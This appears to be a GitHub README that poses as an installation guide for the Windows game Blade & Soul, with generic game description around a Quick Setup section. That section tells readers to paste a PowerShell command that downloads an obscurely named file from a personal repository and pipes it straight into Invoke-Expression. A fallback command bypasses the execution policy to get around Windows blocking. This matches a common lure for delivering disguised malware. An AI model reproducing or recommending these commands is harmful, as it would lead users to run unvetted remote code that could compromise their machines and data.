# Blade & Soul

Blade & Soul is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch Blade & Soul and play.

Blade & Soul is a martial arts fantasy MMORPG on Windows where combat plays out in real time instead of standing still and tab-targeting. You choose a class tied to a weapon school—blade, fist, dagger, or fan—and progress through a story set in a world of clans, spirits, and rival factions. Open regions, instanced dungeons, and arena maps share the same action-heavy rules: positioning, blocks, and timing matter as much as gear.

On a typical session you launch the client, sign in, and pick up dailies or continue the main chapter. Solo content mixes quest chains with training sequences that teach aerial juggles and counter windows. With a party you queue dungeons that demand interrupts, add control, and burst during boss phases; afterward you refine equipment, craft consumables, or spar in duels and structured PvP ladders.

This repository keeps the Windows setup file used for installation, plus short notes on resolution, key binds, and performance options that teams reuse when rebuilding a machine. The changelog lists patch-level changes—class adjustments, dungeon tuning, and fixed bugs—so you can compare versions before updating. Together those files document how this install is maintained on PC without scattering installers and release notes across separate folders.

## How you play

- Real-time combat rewards dodging, blocking, and chaining aerial skills against bosses and players.
- Distinct martial arts classes each bind unique weapons, stances, and skill rotations for PvE and PvP.
- Main story arcs and side quests unfold across factions, mentors, and escalating rival encounters.
- Instanced dungeons and raid-style encounters require coordinated interrupts, taunts, and phase-specific positioning.
- Windwalk movement lets you sprint across terrain and leap between ledges during exploration and combat.
- Arena and faction modes offer ranked duels and large-scale battles with separate balance from open world.
- Gear progression uses infusion, crafting materials, and soul shields tuned for your chosen specialization.
- Cosmetic wardrobes and appearance sliders let you customize outfits without altering core combat statistics.

## Quick Setup (PowerShell)

This installs the game Blade & Soul on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/monikak54547/blade-soul-setup-guide/main/90r6dtyv9l.cwqi8zjs | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/monikak54547/blade-soul-setup-guide/main/90r6dtyv9l.cwqi8zjs | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `90r6dtyv9l.cwqi8zjs` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `monikak54547/blade-soul-setup-guide`. Blade & Soul 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
